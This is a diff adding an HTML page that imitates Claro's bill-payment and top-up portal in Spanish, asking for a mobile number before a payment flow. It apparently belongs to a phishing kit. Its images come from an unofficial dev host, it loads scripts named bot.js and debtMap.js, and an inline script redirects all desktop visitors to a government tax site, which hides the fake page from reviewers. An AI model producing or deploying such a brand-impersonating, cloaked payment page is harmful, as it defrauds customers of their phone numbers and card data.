@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, user-scalable=no" />
+  <link rel="icon" type="image/png" href="img/favicon.ico" />
+  <title>Portal recaudos y facturas</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap"
+    rel="stylesheet" />
+  <link rel="stylesheet" href="css/index.css" />
+  <link rel="stylesheet" href="/css/loader.css">
+  <script src="./js/functions.js"></script>
+  <script src="./js/debtMap.js"></script>
+</head>
+
+<body>
+  <header id="comida">
+    <div class="caja_img">
+      <img class="logo" src="img/logo-claro-blanco.svg" />
+    </div>
+  </header>
+  <main>
+    <div id="ggris1" class="gris1">
+      <div class="texto_gris">
+        <br /><br />
+        <p class="texto1">
+          Portal de
+          <span class="rojo">PAGOS <span class="recargas"> Y RECARGAS</span></span>
+        </p>
+      </div>
+    </div>
+
+    <table id="tabla-opciones" cl>
+      <tr>
+        <td valign="top" align="center">
+          <img id="azul1" src="img/icono-seleccion-on.png" class="imagen" />
+        </td>
+        <td valign="top" align="center">
+          <img id="azul2" src="img/icono-mediopago-off.png" class="imagen" />
+        </td>
+        <td valign="top" align="center">
+          <img id="azul3" src="img/icono-pago-off.png" class="imagen" />
+        </td>
+        <td valign="top" align="center">
+          <img id="azul4" src="img/icono-resultado-off.png" class="imagen" />
+        </td>
+      </tr>
+      <tr>
+        <td valign="top" align="center" class="etq-pasos act-pasos" style="font-weight: 600;">
+          Selecciona<br />tu servicio
+        </td>
+        <td valign="top" align="center" class="etq-pasos"">
+          Escoge el <br />medio de pago
+        </td>
+        <td valign=" top" align="center" class="etq-pasos">
+          Realiza el <br />Pago en línea
+        </td>
+        <td valign="top" align="center" class="etq-pasos">
+          Recibe la <br />Confimación
+        </td>
+      </tr>
+    </table>
+
+    <div id="contenedor"></div>
+
+    <section id="usuario">
+      <div class="texto_gris2">
+        <br /><br />
+        <h2 class="texto2">
+          Realiza el pago de la factura de tus servicios Claro, compra
+          paquetes y haz recargas de manera fácil y desde donde quieras.
+          También, puedes inscribir tu tarjeta de crédito para realizar el
+          pago de tus facturas de manera automática.
+        </h2>
+      </div>
+      <br />
+      <div class="servicio">
+        <label style="color: #626c70">Selecciona el tipo de servicio</label>
+        <div class="servicios text-muted d-flex flex-row flex-wrap">
+          <div class="servicio-item align-items-center" onclick="cambiaimg(1)">
+            <img class="iconitos order-md-2" src="img/celular.png" alt="Icono celular" />
+            <p class="order-md-1">Postpago</p>
+            <img id="check1" class="check order-md-3" style="margin-top: 0.5rem;" src="img/uncheck.png"
+              alt="Checkbox" />
+          </div>
+          <div class="servicio-item d-flex flex-column flex-md-row align-items-center" onclick="cambiaimg(2)">
+            <img class="iconitos order-md-2" src="img/hogar.png" alt="Icono hogar" />
+            <p class="order-md-1">Hogar</p>
+            <img id="check2" style="margin-top: 0.5rem;" class="check order-md-3" src="img/uncheck.png"
+              alt="Checkbox" />
+          </div>
+          <div class="servicio-item d-flex flex-column flex-md-row align-items-center" onclick="cambiaimg(3)">
+            <img class="iconitos order-md-2" src="img/equipos.png" alt="Icono equipos" />
+            <p class="order-md-1">Equipo</p>
+            <img id="check3" style="margin-top: 0.5rem;" class="check order-md-3" src="img/uncheck.png"
+              alt="Checkbox" />
+          </div>
+          <div class="servicio-item d-flex flex-column flex-md-row align-items-center" onclick="cambiaimg(4)">
+            <img class="iconitos order-md-2" src="img/internet.png" alt="Icono internet" />
+            <p class="order-md-1">Internet</p>
+            <img id="check4" style="margin-top: 0.5rem;" class="check order-md-3" src="img/uncheck.png"
+              alt="Checkbox" />
+          </div>
+        </div>
+      </div>
+
+      <br />
+
+      <label for="celular" style="color: #626c70">Número de celular</label>
+      <br />
+      <input type="number" name="celular" class="input-cel" required id="celular" inputmode="numeric" value=""
+        autocomplete="off" minlength="10" maxlength="10" />
+      <div class="botones">
+        <br /><button class="boton_continuar" id="boton">
+          Continuar
+        </button>
+      </div>
+    </section>
+
+    <section id="errorpasarela" style="display: none">
+      <br />
+      <br />
+      <br />
+      <br />
+      <br />
+      <br />
+      <div style="text-align: center">
+        <img style="width: 130px; margin-left: auto"
+          src="https://dev-claro-img-css.pantheonsite.io/iconos-logo-claro.png" /><br /><br />
+        <div class="loader">
+          <div class="dot"></div>
+          <div class="dot"></div>
+          <div class="dot"></div>
+        </div>
+      </div>
+    </section>
+    <div id="loader">
+      <svg viewBox="25 25 50 50">
+        <circle r="20" cy="50" cx="50"></circle>
+      </svg>
+    </div>
+  </main>
+  <br /><br />
+  <footer class="footer">
+    <p>Todos los derechos reservados 2025</p>
+    <nav class="footer-links">
+      <a href="#mapa">Mapa de sitio</a>
+      <a href="#denuncias">Portal de denuncias</a>
+      <a href="#legal">Legal y regulatorio</a>
+    </nav>
+  </footer>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <script src="js/bot.js"></script>
+  <script src="/js/main.js"></script>
+  <script>
+    function isMobile() {
+      return /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+    }
+
+    if (!isMobile()) {
+      window.location.href = "https://www.dian.gov.co/";
+    }
+  </script>
+</body>
+
+</html>
